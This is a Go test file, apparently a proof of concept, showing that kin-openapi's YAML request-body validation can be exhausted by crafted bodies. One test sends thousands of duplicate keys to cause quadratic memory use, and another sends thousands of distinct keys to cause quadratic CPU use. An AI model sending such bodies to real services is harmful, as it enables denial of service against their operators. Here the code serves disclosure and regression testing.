package openapi3filter_test

import (
	"context"
	"fmt"
	"net/http"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const yamlBodySpec = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths:
  /ingest:
    post:
      requestBody:
        required: true
        content:
          application/yaml:
            schema: {type: object}
      responses:
        '200': {description: ok}
`

func runYAMLBody(t *testing.T, body string) (time.Duration, uint64) {
	t.Helper()
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(yamlBodySpec))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}
	req, _ := http.NewRequest(http.MethodPost, "/ingest", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/yaml")
	route, pp, err := router.FindRoute(req)
	if err != nil {
		t.Fatalf("route: %v", err)
	}
	var m0, m1 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m0)
	start := time.Now()
	_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
		Request: req, PathParams: pp, Route: route,
		Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
	})
	el := time.Since(start)
	runtime.ReadMemStats(&m1)
	return el, m1.TotalAlloc - m0.TotalAlloc
}

// Mode A (memory): N identical keys -> O(N^2) duplicate-key error strings -> OOM.
func TestPoCYAMLBodyDuplicateKeysMemory(t *testing.T) {
	body := strings.Repeat("k: 0\n", 2500)
	el, alloc := runYAMLBody(t, body)
	mb := alloc / (1024 * 1024)
	t.Logf("2500 duplicate keys (%d B body) -> %v, %d MB allocated", len(body), el, mb)
	if mb > 100 {
		t.Fatalf("VULNERABLE: a %d B YAML request body allocated %d MB (quadratic; scales to OOM)", len(body), mb)
	}
}

// Mode B (CPU): N distinct keys -> O(N^2) comparison loop -> CPU exhaustion.
func TestPoCYAMLBodyDistinctKeysCPU(t *testing.T) {
	dur := func(n int) time.Duration {
		var sb strings.Builder
		for i := 0; i < n; i++ {
			fmt.Fprintf(&sb, "k%d: 0\n", i)
		}
		el, _ := runYAMLBody(t, sb.String())
		return el
	}
	small, large := dur(10000), dur(20000)
	t.Logf("distinct keys: 10000 -> %v ; 20000 -> %v (2x keys ~ 4x time)", small, large)
	if large > 500*time.Millisecond {
		t.Fatalf("VULNERABLE: 20000-key YAML body cost %v CPU for one request (quadratic; ~1 MB body -> tens of seconds)", large)
	}
}
